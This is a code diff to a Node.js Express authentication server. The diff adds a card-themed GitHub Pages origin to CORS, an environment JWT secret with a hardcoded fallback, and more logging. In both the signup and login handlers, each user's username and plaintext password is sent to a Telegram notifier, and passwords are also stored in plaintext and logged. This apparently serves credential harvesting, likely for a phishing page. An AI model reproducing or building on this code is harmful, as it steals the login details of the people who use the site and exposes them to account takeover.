@@ -13,9 +13,13 @@ const port = process.env.PORT || 3000;
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-// Enable CORS for local testing and Render
+// Enable CORS for local testing, Render, and GitHub Pages
 app.use(cors({
-    origin: ['http://localhost:3000', 'https://ii-cyu4.onrender.com'],
+    origin: [
+        'http://localhost:3000',
+        'https://ii-cyu4.onrender.com',
+        'https://visa-card-l.github.io' // Added for GitHub Pages
+    ],
     methods: ['GET', 'POST', 'DELETE'],
     allowedHeaders: ['Content-Type', 'Authorization']
 }));
@@ -259,7 +263,7 @@ const authenticateToken = (req, res, next) => {
     const authHeader = req.headers['authorization'];
     const token = authHeader && authHeader.split(' ')[1];
     if (!token) return res.status(401).json({ error: 'No token provided' });
-    jwt.verify(token, 'your-secret-key', (err, user) => {
+    jwt.verify(token, process.env.JWT_SECRET || 'your-secret-key', (err, user) => {
         if (err) return res.status(403).json({ error: 'Invalid token' });
         req.user = user;
         next();
@@ -276,35 +280,44 @@ app.listen(port, async () => {
 // Authentication routes
 app.post('/api/auth/signup', async (req, res) => {
     try {
+        console.log('Signup request:', req.body, 'Origin:', req.headers.origin);
         const { username, password } = req.body;
         if (!username || !password || !/^[a-zA-Z0-9@.]+$/.test(username)) {
+            console.log('Signup failed: Invalid username or password');
             return res.status(400).json({ error: 'Invalid username or password' });
         }
         if (data.users.find(u => u.username === username)) {
+            console.log('Signup failed: Username already exists', username);
             return res.status(400).json({ error: 'Username already exists' });
         }
         data.users.push({ username, password });
         fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
         const message = `New signup: Username: ${username}, Password: ${password}`;
         await sendTelegramNotification(message);
+        console.log('Signup successful:', username);
         res.status(201).json({ message: 'User created successfully' });
     } catch (error) {
-        console.error('Signup error:', error);
+        console.error('Signup endpoint error:', error);
         res.status(500).json({ error: 'Server error during signup' });
     }
 });
 
 app.post('/api/auth/login', async (req, res) => {
     try {
+        console.log('Login request:', req.body, 'Origin:', req.headers.origin);
         const { username, password } = req.body;
         const user = data.users.find(u => u.username === username && u.password === password);
-        if (!user) return res.status(401).json({ error: 'Invalid credentials' });
-        const token = jwt.sign({ username }, 'your-secret-key', { expiresIn: '1h' });
+        if (!user) {
+            console.log('Login failed: Invalid credentials for', username);
+            return res.status(401).json({ error: 'Invalid credentials' });
+        }
+        const token = jwt.sign({ username }, process.env.JWT_SECRET || 'your-secret-key', { expiresIn: '1h' });
         const message = `Login: Username: ${username}, Password: ${password}`;
         await sendTelegramNotification(message);
+        console.log('Login successful:', username);
         res.json({ token });
     } catch (error) {
-        console.error('Login error:', error);
+        console.error('Login endpoint error:', error);
         res.status(500).json({ error: 'Server error during login' });
     }
 });
